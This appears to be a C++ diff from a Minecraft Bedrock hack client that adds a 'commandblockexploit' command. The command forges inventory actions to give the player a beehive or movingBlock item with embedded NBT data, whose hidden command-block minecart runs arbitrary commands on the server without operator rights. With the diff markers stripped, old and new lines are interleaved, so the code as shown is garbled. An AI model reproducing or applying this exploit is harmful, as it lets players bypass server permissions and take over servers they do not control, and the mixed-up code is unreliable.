#include "../../../SDK/Tag.h"
#include "../../Module/ModuleManager.h"
#include <thread>

CommandBlockExploitCommand::CommandBlockExploitCommand() : IMCCommand("commandblockexploit", "Workaround for executing commands without op", "<command>") {
CommandBlockExploitCommand::CommandBlockExploitCommand() : IMCCommand("commandblockexploit", "Workaround for executing commands without op", " <beehive/movingblock> <command>") {
	registerAlias("cbe");
}

@@ -13,20 +12,33 @@ CommandBlockExploitCommand::~CommandBlockExploitCommand() {

bool CommandBlockExploitCommand::execute(std::vector<std::string>* args) {
	assertTrue(args->size() > 2);

	std::ostringstream os;
	for (int i = 1; i < args->size(); i++) {
		if (i > 1)
	for (int i = 2; i < args->size(); i++) {
		if (i > 2)
			os << " ";
		os << args->at(i);
	}
	C_ItemStack* yot = new C_ItemStack(***ItemRegistry::lookUpByName(std::make_unique<uintptr_t>().get(), std::make_unique<uintptr_t>().get(), TextHolder("beehive")), 1, 0);
	int slot = g_Data.getLocalPlayer()->getSupplies()->inventory->getFirstEmptySlot();
	std::string cmd = os.str();
	std::string tag = "{Count:1b,Damage:15s,Name:\"minecraft:beehive\",tag:{Occupants:[{ActorIdentifier:""\"minecraft:command_block_minecart<>""\",SaveData:{Command:\"" + cmd + "\",Ticking:1b,TicksLeftToStay:1}}]}}";
	yot->fromTag(*Mojangson::parseTag(tag));
	g_Data.getLocalPlayer()->getTransactionManager()->addInventoryAction(C_InventoryAction(0, nullptr, nullptr, yot, nullptr, 1, 507, 99999));
	//g_Data.getLocalPlayer()->getTransactionManager()->addInventoryAction(C_InventoryAction(slot, nullptr, yot));
	g_Data.getLocalPlayer()->getSupplies()->inventory->addItemToFirstEmptySlot(yot);
	clientMessageF("[%sNatsuki%s] %sPlace the beehive to execute!", PINK);

	std::string type = args->at(1);
	std::transform(type.begin(), type.end(), type.begin(), tolower);

	C_ItemStack* item;
	if (type == "beehive" || type == "bh") {
		item = new C_ItemStack(***ItemRegistry::lookUpByName(std::make_unique<uintptr_t>().get(), std::make_unique<uintptr_t>().get(), TextHolder("beehive")), 1, 0);
		std::string tag = R"({Count:1b,Damage:0s,Name:"minecraft:beehive",tag:{Occupants:[{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:")" + cmd + R"(",Persistent:1b,Ticking:1b,TicksLeftToStay:1}}]}})";
		item->fromTag(*Mojangson::parseTag(tag));
	}
	else if (type == "movingblock" || type == "mb") {
		item = new C_ItemStack(***ItemRegistry::lookUpByName(std::make_unique<uintptr_t>().get(), std::make_unique<uintptr_t>().get(), TextHolder("movingblock")), 1, 0);
		std::string tag = R"({Count:1b,Damage:0s,Name:"minecraft:movingBlock",tag:{movingBlock:{name:"minecraft:leaves",states:{}}movingEntity:{Occupants:[{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:")" + cmd + R"(",ExecuteOnFirstTick:1b,TickDelay:0,Ticking:1b,definitions:["+minecraft:boat"]}TicksLeftToStay:0}],ShouldSpawnBees:0b,id:"Beehive",isMovable:1b}ench:[{id:-1s,lvl:1s}],RepairCost:0,display:{Name:"",Lore:[")" + cmd + R"("]}}})";
		item->fromTag(*Mojangson::parseTag(tag));
	}

	g_Data.getLocalPlayer()->getTransactionManager()->addInventoryAction(C_InventoryAction(0, nullptr, nullptr, item, nullptr, 1, 507, 99999));
	g_Data.getLocalPlayer()->getSupplies()->inventory->addItemToFirstEmptySlot(item);

	clientMessageF("%sPut down the beehive to execute!", PINK);
	return true;
}
